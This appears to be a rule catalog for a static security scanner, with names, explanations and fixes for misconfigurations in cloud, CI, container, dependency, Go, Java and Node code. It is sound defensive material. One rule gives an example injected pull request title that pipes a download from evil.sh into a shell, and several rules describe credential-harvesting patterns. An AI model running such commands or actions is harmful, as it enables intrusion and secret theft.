name: Model provider API key exposed in client code
message: Model provider API key is exposed in client-side bundle or window object
why: Exposing AI model API keys (OpenAI, Anthropic, Gemini) in client-side code via VITE_, NEXT_PUBLIC_, or the window object compiles them directly into user-facing JavaScript bundles, where anyone can extract and abuse them.
fix: Route AI requests through a backend server or API proxy where credentials remain securely stored in server-side environment variables.

name: LLM output passed to dynamic code execution
message: LLM output is passed directly to dynamic code execution
why: Passing unverified model completions directly to eval, exec, or Function allows untrusted or hallucinated model output to execute arbitrary code with the process privileges, leading to Remote Code Execution.
fix: Parse structured output using strict schemas or JSON.parse, validate values against an allowlist, and use deterministic logic instead of runtime code evaluation.

name: LLM output interpolated into SQL query
message: SQL query constructed with unparameterized LLM output
why: LLM output interpolated directly into raw SQL queries without parameterization allows prompt injection to alter query syntax, resulting in database compromise and SQL injection.
fix: Use parameterized queries or prepared statements where model output is supplied as parameters rather than concatenated directly into the query string.

name: MCP config exposes raw shell or root directory
message: MCP configuration exposes raw shell execution or root filesystem access
why: Exposing raw command shells (bash, sh, cmd) or mounting the root filesystem (/, C:\) to an LLM via the Model Context Protocol gives the model unrestricted execution and access over the host, turning prompt injection into full compromise.
fix: Expose only scoped, domain-specific MCP tools with strict parameters rather than general-purpose shell binaries, and restrict filesystem tools to dedicated sandbox directories.

name: Untrusted context interpolated into system prompt without delimiters
message: Untrusted user input is interpolated into system prompt without boundary delimiters
why: Interpolating raw user data or retrieved context directly into system instructions without boundary delimiters or structural tags enables direct prompt injection attacks, allowing attackers to hijack model behavior.
fix: Enclose untrusted context within distinct delimiters such as XML tags (<context>...</context>) or Markdown fences, and instruct the model to treat content within boundaries strictly as data.

name: CloudTrail multi-region logging is disabled
message: CloudTrail trail sets IsMultiRegionTrail to false
why: Disabling multi-region trails leaves activity in inactive AWS regions unmonitored. Attackers frequently target unused regions to deploy malicious workloads or avoid security monitoring.
fix: Set IsMultiRegionTrail to true on the AWS::CloudTrail::Trail resource to record events across all AWS regions.

name: EBS volume is not encrypted
message: EBS volume has encryption disabled or omitted
why: Unencrypted EBS volumes expose stored data, snapshots, and attached block devices to unauthorized read access in the event of snapshot exposure or volume detachment.
fix: Set Encrypted: true on the AWS::EC2::Volume resource and optionally specify a KMS key with KmsKeyId.

name: IAM policy allows wildcard action
message: IAM policy grants wildcard action '*' with Effect Allow
why: Granting Action '*' with Allow grants administrative privileges across all AWS services, violating the principle of least privilege and allowing complete account compromise if the principal is compromised.
fix: Restrict the policy action list to the specific API calls required by the workload and scope the Resource ARN accordingly.

name: RDS database instance is publicly accessible
message: RDS instance sets PubliclyAccessible to true
why: Configuring an RDS instance to be publicly accessible assigns it a public IP address accessible from the internet, increasing the attack surface to unauthorized credential probing and network-level attacks.
fix: Set PubliclyAccessible to false and place the database within private VPC subnets accessed via internal routing or VPC peering.

name: S3 bucket allows public access
message: S3 bucket allows public access or disables public access block
why: Publicly accessible S3 buckets expose data to unauthenticated internet users and allow unauthorized read or write access. Enabling PublicAccessBlockConfiguration and avoiding public ACLs prevents accidental data exposure.
fix: Remove public ACLs (PublicRead, PublicReadWrite) and configure PublicAccessBlockConfiguration with BlockPublicAcls, BlockPublicPolicy, IgnorePublicAcls, and RestrictPublicBuckets set to true.

name: Security group ingress opens sensitive port to the internet
message: Security group ingress allows 0.0.0.0/0 on sensitive port
why: Opening administrative (22 SSH, 3389 RDP) or database (5432 Postgres, 3306 MySQL, 1433 MSSQL) ports to 0.0.0.0/0 exposes infrastructure to automated internet scanning, brute-force attacks, and exploit attempts.
fix: Restrict the ingress rule CidrIp to specific authorized IP ranges or VPC CIDR blocks, or connect securely via AWS Systems Manager Session Manager or a bastion host.

name: Workflow does not set an explicit permissions block
message: No explicit permissions block, so the workflow inherits the repository default
why: The repository default may be read-write, and it can be changed organization-wide without touching this file. An explicit block makes the grant visible in review and immune to that drift.
fix: Add `permissions: {contents: read}` at the top of the workflow and widen per job where needed.

name: pull_request_target checks out untrusted PR code
message: Workflow runs on pull_request_target and checks out the pull request head
why: pull_request_target runs with the base repository's secrets and a writable token, unlike pull_request. Checking out the fork's code in that context means any stranger who opens a pull request can execute code with your credentials. This is the single most exploited CI misconfiguration there is.
fix: Use the pull_request trigger instead, or keep pull_request_target but do not check out or execute PR code. If you need both, split into two workflows and pass only inert data between them.

name: Attacker-controlled context interpolated into a shell
message: A run step interpolates attacker-controlled github context directly into the shell
why: Expressions are substituted into the script before the shell sees it, so a pull request title of `a"; curl evil.sh | sh; #` becomes part of the command. The attacker needs no write access, only the ability to open an issue or a pull request.
fix: Pass the value through an env var and reference it as "$TITLE" inside the script. The shell then treats it as data, never as syntax.

name: Secret written to the build log
message: A run step prints a secret to standard output
why: GitHub masks known secret values in logs, but masking fails on transformed values such as base64 or a substring, and build logs on a public repository are world-readable and archived.
fix: Remove the echo. If you need to confirm a secret is set, test its length rather than printing it.

name: Job runs on a self-hosted runner
message: Job targets a self-hosted runner
why: Self-hosted runners are not ephemeral by default, so one job can leave state, credentials, or a backdoor for the next. On a public repository a fork pull request can reach the runner and therefore your network.
fix: Use ephemeral runners that are destroyed after each job, keep them off the production network, and never enable them for public fork pull requests.

name: Third-party action pinned to a mutable ref
message: Third-party action pinned to a mutable ref: {{uses}}
why: A tag or branch can be repointed by whoever owns the repository, at any time and with no notice to you. The next run then executes their new code in a job that holds your secrets and can push to your repository.
fix: Pin to the full 40-character commit SHA, with the human-readable version in a trailing comment. Dependabot updates SHA pins.

name: Attacker-controlled GitHub context interpolated into shell command
message: A run step interpolates untrusted github context directly into shell execution
why: Direct interpolation of ${{ github.head_ref }} or ${{ github.event.issue.body }} into a shell script runs before shell parsing, allowing an attacker to inject shell metacharacters (such as semicolons or backticks) and execute arbitrary commands.
fix: Assign the context variable to an intermediate environment variable in env: and reference it in the script using shell variable syntax (e.g. "$BODY" or "$HEAD_REF").

name: Privileged workflow_run workflow downloads untrusted artifacts
message: Workflow triggered by workflow_run downloads untrusted artifacts from triggering run
why: Workflows triggered by workflow_run execute in the context of the default branch with access to repository secrets and write tokens. Downloading artifacts produced by an untrusted fork's pull request workflow allows malicious code execution in a privileged runner.
fix: Avoid downloading artifacts in workflow_run, or cryptographically verify signatures and strictly parse only plain data without executing scripts or binaries from artifacts.

name: workflow_run checks out code from the triggering run
message: Workflow runs on workflow_run and checks out the triggering run's code
why: workflow_run executes in the base repository context with secrets, and the run that triggered it may have been produced by an untrusted fork. This is pull_request_target's problem wearing a different trigger.
fix: Download and treat artifacts from the triggering run as untrusted data, and do not check out or execute its code.

name: Workflow grants write-all permissions
message: Workflow token is granted write-all
why: Every step, including every third-party action, inherits a token that can push code, alter releases, and change repository settings. One compromised action is then a full repository takeover rather than a contained incident.
fix: Set `permissions: {contents: read}` at the workflow level and grant individual write scopes only on the jobs that need them.

name: Cloudflare Worker CORS pairs wildcard origin with credentials
message: Worker sets Access-Control-Allow-Origin to * while allowing credentials
why: Allowing credentials with a wildcard origin is prohibited by browsers and indicates an insecure CORS configuration that risks exposing authenticated responses to arbitrary cross-origin sites.
fix: Set Access-Control-Allow-Origin to a trusted specific origin or reflect the incoming Origin header only after validating it against a strict allowlist.

name: Cloudflare D1 query built by concatenation or template interpolation
message: Cloudflare D1 prepare interpolates or concatenates query parameters
why: Interpolating or concatenating values directly into SQL statements allows user input to alter the query logic and structure, enabling unauthorized data access, modification, or deletion.
fix: Use parameterized queries with question mark placeholders and pass values using .bind(...).

name: Cloudflare Worker fetch directly invoked with unvalidated request URL or query parameter
message: Worker fetch invoked directly with unvalidated request URL or parameter
why: Invoking fetch directly on user-supplied URLs or query parameters allows attackers to trigger requests to internal services, loop back into edge worker routines, or access restricted cloud metadata endpoints.
fix: Validate destination URLs against an explicit hostname allowlist before fetching, or restrict outbound requests to known backend endpoints.

name: Plaintext secret variable in wrangler configuration
message: Plaintext secret committed to wrangler configuration
why: Plaintext secrets in wrangler configuration are readable by anyone with repository access and are bundled into deployment artifacts. Cloudflare Workers supports encrypted secrets via wrangler secret put.
fix: Remove plaintext secret values from [vars] in wrangler.toml or wrangler.json and add them via wrangler secret put <NAME>.

name: Docker socket mounted into container
message: Container mounts the Docker daemon control socket
why: Access to the Docker socket allows any process inside the container to issue arbitrary commands to the host Docker daemon, including creating privileged containers that mount the host filesystem. This is a complete host compromise.
fix: Avoid mounting the Docker socket into application containers. If container orchestration is required, use a scoped API proxy or isolated rootless container runtime.

name: Service uses host network mode
message: Service configures network_mode host
why: Using host networking disables network isolation between the container and the host. The container can bind to any host port, intercept local network traffic, and access loopback services that assume local-only trust.
fix: Use a dedicated bridge or overlay network and expose only the specific required ports via the ports configuration.

name: Service declares no resource limits
message: Service sets no memory or CPU limits
why: Without resource limits, a container undergoing a denial-of-service attack, infinite loop, or memory leak can exhaust all host CPU or RAM, crashing adjacent containers or the host machine.
fix: Define resource limits for the service using mem_limit and cpus, or deploy.resources.limits.memory and deploy.resources.limits.cpus.

name: Docker Compose service runs privileged
message: Service runs with privileged true
why: A privileged container has access to all host devices and bypasses almost all Linux kernel isolation mechanisms. An attacker with code execution in a privileged container can trivially escape to the underlying host.
fix: Remove privileged true and grant only the specific Linux capabilities needed using the cap_add option (such as NET_ADMIN or SYS_PTRACE).

name: Root or critical host system path mounted
message: Container mounts host root or sensitive system path
why: Mounting the host root directory (/) or sensitive host paths (/etc, /proc, /sys) gives the container visibility or write access to the host's operating system files, credentials, and kernel tunables, enabling container escape.
fix: Mount only dedicated application data directories into the container, and never mount the host root directory, /etc, /proc, or /sys.

name: ADD fetches a remote URL
message: ADD downloads a remote URL into the image
why: ADD from a URL fetches over the network at build time with no checksum and no signature check, so whoever controls that URL controls what ends up in your image.
fix: Use RUN with curl or wget plus an explicit checksum verification, or vendor the artifact and COPY it.

name: Build pipes a downloaded script straight into a shell
message: RUN pipes a downloaded script directly into a shell
why: The script is executed unverified, and the server can serve different content to your build than it serves to a human reviewing the URL.
fix: Download to a file, verify a pinned checksum or signature, then execute it.

name: Container explicitly switches back to root
message: Final stage sets USER root
why: Setting USER back to root in the shipping stage undoes the containment, and it usually happens because a runtime step needed a privileged directory that could have been chowned at build time instead.
fix: Chown the paths the process needs at build time, then keep the non-root USER for the runtime stage.

name: Base image pinned to a mutable tag
message: Base image uses the mutable :latest tag: {{image}}
why: The content behind :latest changes without notice, so the image you tested is not necessarily the image you deploy, and a compromised upstream tag reaches you on the next build.
fix: Pin to an explicit version, and ideally to a digest with @sha256.

name: Container missing healthcheck instruction
message: Container defines EXPOSE, CMD, or ENTRYPOINT without a HEALTHCHECK instruction
why: Without a HEALTHCHECK instruction, the container engine and orchestrator cannot detect when an application process deadlocks, hangs, or crashes internally, leaving unresponsive containers in service and continuing to receive traffic.
fix: Add a HEALTHCHECK instruction in the final stage (e.g., `HEALTHCHECK --interval=30s --timeout=3s CMD curl -f http://localhost:8080/health || exit 1`).

name: Container runs as root
message: Final image stage never sets USER, so the container runs as root
why: A container escape or an RCE in the application lands with uid 0 inside the container and on every bind-mounted host path. Dropping to a non-root user is the cheapest meaningful containment this image can have.
fix: Add a non-root USER after installing dependencies and before CMD, for example `USER node` on Node base images or a dedicated uid such as `USER 10001`.

name: Credential baked into an image layer
message: ENV or ARG assigns a credential, which persists in the image layer
why: Layers are content-addressed and shipped whole. A value set here is readable with `docker history` by anyone who can pull the image, and deleting it in a later layer does not remove it.
fix: Use BuildKit secret mounts (`RUN --mount=type=secret`) at build time, or inject the value at runtime from a secret manager.

name: Private key copied into the image
message: COPY or ADD brings private key material into the image
why: Anyone who can pull the image gets the key, and it stays in the layer history even if a later stage deletes the file.
fix: Mount the key at runtime, or use BuildKit SSH forwarding (`RUN --mount=type=ssh`) for build-time access.

name: sudo installed in the image
message: Image installs sudo
why: A container has no need to escalate: run the process as the user it should be. Installing sudo turns a non-root USER from containment back into a speed bump.
fix: Drop sudo and set the correct USER, chowning any paths the process must write.

name: Base image not pinned to a digest
message: Base image is not pinned to a digest: {{image}}
why: A version tag can be moved by whoever owns the repository. Only a digest makes the build reproducible and makes an upstream tag swap visible.
fix: Resolve the tag to a digest and pin it as image@sha256:..., then update it deliberately.

name: Build makes paths world-writable
message: RUN sets 777 permissions
why: World-writable paths let any process in the container, including one an attacker lands, replace application code or configuration.
fix: Grant ownership to the runtime user with `chown` and use 755 or 750 instead. 777 is almost always a workaround for a chown that was missing.

name: Script pipes a download straight into a shell
message: Script pipes a downloaded file directly into a shell
why: The downloaded script is executed unverified, and a server can serve different content to an automated fetch than to a human reading the URL.
fix: Download to a file, verify a pinned checksum or signature, then execute it.

name: Git dependency not pinned to a commit
message: Git dependency resolves to a branch rather than a commit
why: Without a commit hash the reference is mutable: a force push to the branch changes what you install, with no version bump and nothing in your diff.
fix: Append the full 40-character commit SHA to the dependency URL, as "#8f4b7c2e1d9a6035fe2cb14d7a09e853b6c1f240".

name: Go module replaced with a local path
message: go.mod replaces a module with a local filesystem path
why: A local replace directive builds from a path that does not exist in CI or on another developer's machine, and it silently bypasses checksum verification for that module.
fix: Remove the replace before merging, or use a Go workspace file which is not committed.

name: Package registry configured over plaintext
message: Package source is configured over plaintext HTTP
why: Anyone on the network path can substitute the package that gets installed, and the installed code runs with the developer's or the build agent's privileges.
fix: Use the HTTPS endpoint of the same registry.

name: Package defines an install lifecycle script
message: Package declares an install lifecycle script
why: Install scripts run automatically on npm install, with the developer's privileges and network access, before any code review of the dependency has happened. They are the standard payload location for a compromised package.
fix: Confirm the script is yours and is necessary. Consider running CI installs with --ignore-scripts and invoking the build step explicitly.

name: Lockfile resolves a package over plaintext
message: Lockfile resolves a package over plaintext HTTP
why: Every install from this lockfile fetches that package over a modifiable channel, and the integrity hash does not help if the attacker can also rewrite the lockfile entry in transit.
fix: Repoint the registry to HTTPS and regenerate the lockfile.

name: Dependency audit turned off
message: npm audit is disabled in project configuration
why: Disabling audit silences the advisory check for everyone on the project, including the person who would otherwise have caught a newly disclosed vulnerability in a transitive dependency.
fix: Leave audit enabled. If a specific advisory is not applicable, record that decision with an override rather than switching off the whole check.

name: Registry auth token in project configuration
message: Registry credential is written into project configuration
why: A publish-scoped token in a committed .npmrc lets anyone with repository read access ship a release of your package to every consumer.
fix: Reference an environment variable with ${NPM_TOKEN} and supply it from CI secrets, then revoke the committed token.

name: pip index served over plaintext
message: pip index URL uses plaintext HTTP
why: Packages are fetched over a channel anyone on the path can modify, and pip executes package build code during install.
fix: Use the HTTPS endpoint of the index.

name: pip configured to skip certificate validation
message: pip is told to trust a host without certificate validation
why: --trusted-host disables TLS verification for that index, so an active network attacker can serve a different package, and pip will execute its setup.py during install.
fix: Fix the certificate chain instead, by installing the internal CA on the build image.

name: Python dependency not pinned
message: Requirement has no version constraint
why: An unpinned requirement resolves to whatever is newest at install time, so the build is not reproducible and a compromised release is picked up immediately.
fix: Pin with == and manage upgrades with pip-tools or a bot, or commit a hash-pinned lock file.

name: Dependency accepts any version
message: Dependency version is a wildcard
why: Any publish by the maintainer, or by anyone who compromises their account, is installed on the next fresh install. There is no review window and no lockfile guarantee for a new environment.
fix: Pin to a caret or exact range, and let a bot propose upgrades so they pass through review.

name: Server listening on all network interfaces
message: Service is configured to bind to all network interfaces (0.0.0.0 or wildcard port)
why: Binding to all network interfaces exposes local internal services or administrative endpoints to the broader network or public Internet.
fix: Bind explicitly to a private internal IP address or 127.0.0.1 for local services.

name: Operating system command executed via shell interpreter
message: Shell interpreter invoked to execute system command with dynamic input
why: Passing dynamic strings to a shell interpreter via -c allows command injection through shell metacharacters. Any unvalidated input can execute arbitrary commands with the privileges of the process.
fix: Invoke the target executable directly with arguments passed as separate slice elements instead of routing through a shell interpreter.

name: Insecure cookie missing HttpOnly or Secure flag
message: Cookie has HttpOnly or Secure explicitly set to false
why: Cookies configured with HttpOnly or Secure set to false can be accessed by client-side scripts via document.cookie during XSS attacks, or transmitted in plaintext over unencrypted HTTP connections where network eavesdroppers can capture session tokens.
fix: Explicitly set HttpOnly: true and Secure: true on all session and authentication cookies in Go services.

name: Permissive CORS wildcard origin configuration
message: CORS is configured with a wildcard origin allowing all domains
why: Permitting all origins allows arbitrary third-party websites to issue cross-origin requests to internal application APIs on behalf of authenticated users.
fix: Explicitly configure allowed origins with a whitelist of trusted domains (e.g., AllowedOrigins: []string{"https://app.example.com"}).

name: Process environment harvested to network
message: Complete environment variable table is prepared for transmission or sent over HTTP
why: Dumping and serializing os.Environ() into an outbound network payload leaks all environment variables, including secrets and tokens.
fix: Transmit only specific, required configuration fields rather than serializing the entire os.Environ() slice.

name: Gin framework running in debug mode
message: Gin web framework configured to run in debug mode
why: Running the Gin web framework in debug mode outputs detailed routing logs, internal handlers, and stack traces that expose internal application structure and file paths to users and observers.
fix: Use gin.SetMode(gin.ReleaseMode) in production deployments and load the active environment from configuration.

name: Template contextual escaping bypassed with template.HTML or template.JS
message: Untrusted dynamic input converted to template.HTML or template.JS bypassing auto-escaping
why: Go's html/template package automatically escapes data to prevent Cross-Site Scripting (XSS). Converting dynamic user input or request values into template.HTML, template.JS, or template.URL tells the template engine that the string is safe, completely bypassing contextual escaping and allowing malicious script execution.
fix: Pass raw strings directly to the template data context rather than wrapping untrusted values in template.HTML, or sanitize the HTML with a dedicated sanitizer like bluemonday before conversion.

name: Insecure cipher algorithm (DES or RC4)
message: Insecure cipher algorithm (DES, 3DES, or RC4) is instantiated
why: DES and 3DES have inadequate key lengths susceptible to brute force attacks, and RC4 contains known keystream biases that compromise confidentiality.
fix: Use modern authenticated encryption such as AES-GCM (crypto/cipher NewGCM) or ChaCha20-Poly1305.

name: Insecure JWT parser allows 'none' algorithm
message: JWT parser explicitly permits unauthenticated 'none' signature algorithm
why: Allowing the 'none' signature algorithm permits attackers to forge arbitrary tokens with spoofed identities and bypass all authentication.
fix: Remove UnsafeAllowNoneSignatureType and ensure the Keyfunc explicitly validates expected cryptographic signing methods.

name: Insecure pseudo-random number generator used for sensitive token
message: Pseudo-random generator math/rand is used for security-sensitive token or secret
why: math/rand produces deterministic, predictable sequences unsuitable for cryptographic keys, session tokens, or authentication secrets.
fix: Use crypto/rand instead of math/rand for generating security tokens and secrets.

name: Unvalidated HTTP redirect from request parameter
message: Target URL for http.Redirect is taken directly from an unvalidated request parameter
why: Redirecting users to an unvalidated URL provided in query parameters allows attackers to construct trusted-looking links that redirect victims to phishing or malicious sites.
fix: Validate the redirect target against an allowlist of permitted destinations or verify that the path starts with a single forward slash and does not specify an external scheme or host.

name: SQL query built by string formatting or concatenation
message: SQL query executed with formatted or concatenated string instead of parameter bindings
why: Formatting or concatenating variables directly into a SQL statement allows untrusted input to break out of data literals and alter query logic, leading to arbitrary database access or data loss.
fix: Use parameterized queries with placeholder arguments (''?'' or ''$1'') and pass variables as separate arguments to the database driver.

name: Server-Side Request Forgery from request URL parameter
message: Outbound HTTP request target derived directly from request query or form parameter
why: Triggering outbound HTTP client requests using URLs passed directly from incoming user request parameters allows attackers to make the server issue requests to internal network services, cloud metadata endpoints (169.254.169.254), or loopback interfaces.
fix: Validate the target URL against an explicit allowlist of permitted hosts and schemes, and block access to private, loopback, and link-local IP addresses.

name: Host credential file accessed by code
message: Go code accesses host credential store (.ssh, .aws, .kube, or .npmrc)
why: Reading private keys or cloud credentials from standard user home locations is a primary signature of credential harvesting malware.
fix: Never access host credentials directly in Go application code. Supply credentials via environment variables or cloud metadata services.

name: Predictable temporary file created in shared system directory
message: Temporary file created with predictable path in /tmp or /var/tmp
why: Creating files in shared temporary directories with predictable names allows local attackers to stage symlink attacks (CWE-59) to overwrite sensitive files or hijack file contents before write.
fix: Use os.CreateTemp(dir, pattern) to atomically create temporary files with unguessable random names and restrictive permissions.

name: TLS certificate verification disabled
message: TLS certificate validation is disabled via InsecureSkipVerify: true
why: Disabling TLS certificate verification allows attackers with network access to perform man-in-the-middle (MITM) attacks, intercepting or altering plaintext traffic.
fix: Remove InsecureSkipVerify or set it to false. To trust private certificates, configure RootCAs with a custom cert pool.

name: Weak hash algorithm used for password or credential
message: MD5 or SHA1 used to hash passwords or authentication secrets
why: MD5 and SHA-1 are cryptographically broken due to preimage collisions, extensive rainbow table lookup tables, and extreme vulnerability to high-speed offline GPU brute-force attacks.
fix: Use a salted, work-factor tuned password hashing algorithm such as bcrypt, argon2id, or scrypt.

name: XML decoder configured with custom entity or charset resolvers
message: XML decoder configured with custom Entity map or CharsetReader
why: Go's encoding/xml package disables external entity resolution by default. Configuring a custom Entity map or CharsetReader can reintroduce entity expansion or unvalidated external content processing leading to XXE or unexpected character conversions.
fix: Use the standard xml.Decoder without setting custom Entity maps or CharsetReader callbacks on untrusted inputs unless strictly necessary and thoroughly filtered.

name: Arbitrary file overwrite via archive extraction (Zip Slip)
message: Archive extraction path constructed directly with archive member filename
why: Joining an archive entry's filename directly to a destination directory without verifying that the resolved path stays within the target directory allows maliciously crafted archives containing '../' path traversals to overwrite arbitrary system or application files.
fix: Verify that the target path is cleaned and has the destination directory as a prefix using strings.HasPrefix(filepath.Clean(dest), targetDir) before creating or writing the file.

name: Helm role binding grants cluster-admin
message: Role binding grants the cluster-admin superuser role
why: Binding a service account or user to cluster-admin grants unrestricted superuser privileges across the entire Kubernetes cluster, creating an immediate privilege escalation risk.
fix: Create and bind a custom ClusterRole or Role scoped strictly to the resources and API verbs required by the workload.

name: Helm pod uses host network namespace
message: Helm pod specification sets hostNetwork to true
why: Sharing the host network namespace exposes all network interfaces and traffic on the host node to the container, bypassing network policies and exposing node-local services.
fix: Remove hostNetwork: true or set it to false, allowing Kubernetes CNI to manage container network isolation.

name: Helm container declares no resource limits
message: Helm template container does not declare resources.limits
why: Containers running without resource limits can consume unlimited host CPU and memory, causing resource starvation, node instability, and denial of service for co-located workloads.
fix: Define resources.limits for cpu and memory in the container specification to constrain resource consumption.

name: Helm container runs in privileged mode
message: Helm chart container or values sets securityContext.privileged = true
why: Privileged containers disable Linux container isolation boundaries and grant access to host devices, allowing trivial container breakout to the underlying Kubernetes host node.
fix: Set securityContext.privileged to false in the container spec or values.yaml, and grant only the specific Linux capabilities required via capabilities.add.

name: Operating system command executed via shell interpreter
message: Java command execution invokes shell interpreter with dynamic command string
why: Executing commands through a shell interpreter like sh, bash, or cmd.exe with dynamic arguments allows command injection via shell metacharacters.
fix: Pass the executable and arguments as separate array elements or List items to ProcessBuilder without invoking a shell.

name: Cookie configured with HttpOnly disabled
message: Cookie has HttpOnly flag explicitly set to false
why: Disabling the HttpOnly flag allows client-side scripts to access sensitive session identifiers via document.cookie, facilitating XSS token theft.
fix: Call setHttpOnly(true) on all session and authentication cookies.

name: CORS configured with wildcard origin and credentials
message: CORS configuration permits wildcard origin '*' with credentials enabled
why: Permitting wildcard CORS origins together with user credentials allows any untrusted external domain to read sensitive user data and authentication responses via cross-origin requests.
fix: Specify explicit trusted origins instead of wildcard '*' when credentials (cookies or HTTP auth headers) are permitted.

name: Bulk environment variable harvesting
message: All environment variables are enumerated in bulk
why: Iterating System.getenv() dumps the entire process environment, which typically holds API tokens, database passwords, and cloud keys. This is characteristic of supply-chain telemetry or exfiltration payloads.
fix: Access only specific environment variables needed by the application via System.getenv("NAME").

name: Weak cipher or insecure ECB mode used
message: Insecure cipher (DES, DESede, RC4, Blowfish) or ECB mode selected via Cipher.getInstance
why: Broken ciphers like DES, DESede, RC4, and Blowfish or ECB mode suffer from known cryptanalytic attacks and pattern leakage across identical plaintext blocks.
fix: Use modern authenticated encryption (AEAD) such as AES in GCM mode (AES/GCM/NoPadding) with 256-bit keys and random nonces.

name: Arbitrary object deserialization from untrusted input
message: ObjectInputStream or XMLDecoder deserializes untrusted streams, allowing remote code execution via gadget chains
why: Java deserialization invokes readObject() callbacks automatically on instantiated classes during deserialization, enabling remote code execution through classpath gadget chains.
fix: Use safe structured serialization formats like JSON or Protocol Buffers, or enforce a strict ObjectInputFilter allowlist on ObjectInputStream.

name: Insecure pseudo-random number generator used for sensitive token
message: Pseudo-random generator java.util.Random or Math.random is used for security-sensitive token or secret
why: java.util.Random and Math.random produce predictable sequences that an attacker can reverse-engineer to predict future tokens or reset links.
fix: Use java.security.SecureRandom for generating cryptographically secure secrets and tokens.

name: Insecure JWT parser allows 'none' algorithm
message: JWT verification permits unsigned tokens via Algorithm.none or parseClaimsJwt
why: Permitting unsigned tokens allows attackers to forge tokens with spoofed user identifiers without possessing the cryptographic signing key.
fix: Enforce signed tokens using strong cryptographic algorithms (such as HMAC256 or RSA256) and use parseClaimsJws().

name: LDAP query constructed via string concatenation
message: LDAP search filter built by concatenating dynamic parameters
why: Constructing LDAP query filters with dynamic string concatenation allows attackers to inject malicious LDAP filter operators and bypass authentication or retrieve unindexed directory attributes.
fix: Use parameterized search filters with placeholder variables (e.g. ctx.search(base, "(uid={0})", new Object[]{user}, controls)) or sanitize inputs using an LDAP encoder like Spring Security LdapEncoder.filterEncode.

name: Unvalidated HTTP redirect from request parameter
message: HttpServletResponse.sendRedirect target is taken directly from an unvalidated request parameter
why: Redirecting users to an unvalidated URL provided in query parameters allows attackers to construct trusted-looking links that redirect victims to phishing or malicious sites.
fix: Validate the redirect target against an allowlist of permitted destinations or ensure it is a relative path starting with a single forward slash.

name: Path traversal via unvalidated file path concatenation
message: File path constructed directly from HTTP request parameter (path traversal risk)
why: Creating file objects or streams using paths concatenated directly with user-supplied request parameters allows attackers to traverse directory boundaries with '../' and access arbitrary system or configuration files.
fix: Resolve the canonical path using file.getCanonicalPath() and verify that it starts with the canonical path of the allowed base directory, or extract only the base filename using FilenameUtils.getName().

name: Spring Security CSRF protection explicitly disabled
message: Spring Security CSRF protection is explicitly disabled
why: Disabling CSRF protection in Spring Security allows attackers on third-party websites to forge state-changing HTTP requests on behalf of authenticated users via their active session cookies.
fix: Keep CSRF protection enabled. If using stateless token authentication (such as JWTs in authorization headers), document the waiver and ensure cookies are not used for authentication.

name: SQL query built by string formatting or concatenation
message: SQL statement executed with dynamic string concatenation instead of PreparedStatement parameters
why: Interpolating or concatenating dynamic user variables into SQL queries allows attackers to alter query logic and structure, leading to unauthorized database access, data tampering, or data loss.
fix: Use parameterized queries with PreparedStatement and placeholder markers (?) instead of string concatenation or formatting.

name: Server-Side Request Forgery from request parameter
message: Outbound HTTP request target derived directly from incoming request parameter
why: Creating network connections using URLs provided directly by user request parameters allows attackers to trigger SSRF attacks against internal network resources, loopback services, or cloud metadata services (169.254.169.254).
fix: Validate user-supplied URLs against a strict domain and scheme allowlist, resolve the IP address to verify it is not in private or link-local ranges, and disable HTTP redirects.

name: Access to sensitive credential file
message: Sensitive credential file path is accessed directly
why: Accessing private SSH keys, AWS credentials, Kubernetes configs, or Docker auth tokens directly from disk is characteristic of credential harvesting malware. Legitimate applications should use standard identity SDKs or environment injection.
fix: Use standard credential provider chains (such as AWS SDK DefaultCredentialsProvider) or pass credentials via environment variables rather than reading local user credential directories directly.

name: TLS certificate verification or hostname check disabled
message: TLS certificate validation is disabled via empty TrustManager or permissive HostnameVerifier
why: Disabling TLS certificate verification or hostname verification allows man-in-the-middle attackers to intercept, inspect, or tamper with sensitive network traffic.
fix: Use the platform default trust store and default HostnameVerifier, or configure a custom TrustManager that validates the certificate chain against a specific CA.

name: Weak hash algorithm MD5 or SHA-1 used
message: MD5 or SHA-1 hash algorithm selected via MessageDigest or DigestUtils
why: MD5 and SHA-1 suffer from collision and preimage vulnerabilities and are unsuitable for cryptographic security or data integrity verification.
fix: Use SHA-256 or SHA-512 for integrity checksums, or a slow salted algorithm like BCrypt or Argon2id for passwords.

name: XML parser configured to allow external entity resolution
message: XML parser explicitly enables external entity expansion or disables secure processing features
why: Allowing external entity resolution or disabling secure processing enables XML External Entity (XXE) attacks. Attackers can read arbitrary local files, forge server-side requests (SSRF), or cause DoS via billion laughs.
fix: Enable XMLConstants.FEATURE_SECURE_PROCESSING and set "http://apache.org/xml/features/disallow-doctype-decl" to true. Disable external entity resolution.

name: Shell command built from an interpolated value
message: exec builds its command line from an interpolated value
why: exec runs the string through a shell, so `;`, `|`, backticks and `$()` in the interpolated value are all command separators. A filename is enough to take the process.
fix: Use execFile or spawn with an argument array, which never invokes a shell. If you must use a shell, validate against an allowlist rather than escaping.

name: Cookie sent over plaintext
message: Cookie sets secure false
why: A cookie without the Secure attribute is sent over plain HTTP, where any network position can read it.
fix: Set secure true in every environment that is not a local development server, and gate it on the environment rather than hardcoding false.

name: Session cookie readable from JavaScript
message: Cookie sets httpOnly false
why: Any cross-site scripting anywhere on the origin can then read the cookie and exfiltrate the session, turning a contained XSS into full account takeover.
fix: Set httpOnly true. If client code needs state, put non-sensitive state in a separate cookie.

name: CORS allows any origin with credentials
message: CORS policy combines a wildcard origin with credentials
why: Any site the victim visits can then make authenticated requests to your API and read the responses, which is cross-site request forgery with the response body included.
fix: Reflect only origins from an allowlist, and never pair a wildcard with credentials.

name: React dangerouslySetInnerHTML
message: Raw HTML is injected into the DOM without visible sanitization
why: React escapes everything else, which is exactly why this call is worth attention: it is the one place where a stored value becomes markup and script.
fix: Sanitize with DOMPurify immediately before setting, or render the content as structured data rather than HTML.

name: Deprecated cipher API with no explicit IV
message: createCipher derives a key and IV from a password with no salt
why: The removed createCipher API uses MD5-based key derivation and a constant IV, so identical plaintexts produce identical ciphertexts and the key stretching is negligible.
fix: Use createCipheriv with a random IV per message and an AEAD mode such as aes-256-gcm.

name: Process environment harvested to network
message: Entire environment table is serialized into an outbound network request
why: Serializing process.env into an outbound HTTP request exfiltrates API keys, database credentials, and session secrets held in the environment.
fix: Transmit only explicit, required configuration fields rather than serializing the entire process.env table.

name: Dynamic code execution
message: Code is compiled and executed at runtime
why: If any part of the evaluated string derives from input, this is remote code execution with the privileges of the process. Even where it does not, it defeats CSP and makes the code unanalysable by every other tool.
